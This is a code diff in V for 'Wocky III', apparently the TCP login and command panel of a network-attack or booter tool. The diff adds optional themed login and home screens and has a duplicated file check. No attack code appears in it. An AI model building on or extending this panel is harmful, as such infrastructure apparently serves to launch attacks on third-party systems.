@@ -13,6 +13,7 @@ import wocky
 import utilities
 import term_control
 import attack_system
+import wockyfx
 
 import commands // List of Commands
 
@@ -29,16 +30,24 @@ pub fn connection_handler(mut socket net.TcpConn, mut w wocky.Wocky) {
 		term_control.change_size(term_size[0], term_size[1], mut socket)
 	}
 
+	mut username := ""
+	mut password := ""
 	if w.terminal.title != "" {
 		term_control.change_title(w.terminal.title, mut socket)
 	}
 
-	
-	socket.write_string("${config.Red}Username: ${config.Default}") or { 0 }
-	username := reader.read_line() or { "" }
-	socket.write_string("${config.Red}Password: ${config.Black}") or { 0 }
-	password := reader.read_line() or { "" }
-	socket.write_string("${config.Default}") or { 0 }
+	if wockyfx.check_for_wfx_file("username_login") && wockyfx.check_for_wfx_file("username_login") {
+		wockyfx.wockyfx(mut w.wx, "username_login")
+		username = reader.read_line() or { "" }
+		wockyfx.wockyfx(mut w.wx, "password_login")
+		password = reader.read_line() or { "" }
+	} else {
+		socket.write_string("${config.Red}Username: ${config.Default}") or { 0 }
+		username = reader.read_line() or { "" }
+		socket.write_string("${config.Red}Password: ${config.Black}") or { 0 }
+		password = reader.read_line() or { "" }
+		socket.write_string("${config.Default}") or { 0 }
+	}
 
 	// Have to do a auth check here with the username and password later
 	mut login_check, user_info := auth.login(username, password, user_ip, mut w.sqlconn)
@@ -54,7 +63,11 @@ pub fn connection_handler(mut socket net.TcpConn, mut w wocky.Wocky) {
 
 	socket.write_string(config.Clear) or { 0 }
 	w.clients.add_session(username, mut socket, user_ip, user_port)
-	socket.write_string("Welcome to Wocky III\r\n") or { 0 }
+	if wockyfx.check_for_wfx_file("home") {
+		wockyfx.wockyfx(mut w.wx, "home")
+	} else {
+		socket.write_string("Welcome to Wocky III\r\n") or { 0 }
+	}
 	println("${config.Green}[${utilities.current_time()}][+]${config.Default} User succesfully logged in. ${username} | ${user_ip}")
 	println("${config.Green}[${utilities.current_time()}][+]${config.Default} Users Connected: ${w.clients.count}")
 
@@ -66,10 +79,14 @@ pub fn command_handler(mut socket net.TcpConn, mut w wocky.Wocky, db_user_info m
 	mut buffer := core.Buffer{}
 	mut reader := io.new_buffered_reader(reader: socket)
 	for {
-		socket.write_string("[Wocky@NET]~ $ ") or { 
-			w.clients.remove_session(mut socket)
-			socket.close() or { return }
-			return 
+		if wockyfx.check_for_wfx_cmd("home") && wockyfx.check_for_wfx_cmd_data("home") {
+			wockyfx.wockyfx(mut w.wx, "home")
+		} else {
+			socket.write_string("[Wocky@NET]~ $ ") or { 
+				w.clients.remove_session(mut socket)
+				socket.close() or { return }
+				return 
+			}
 		}
 		input_cmd := reader.read_line() or { 
 			w.clients.remove_session(mut socket)
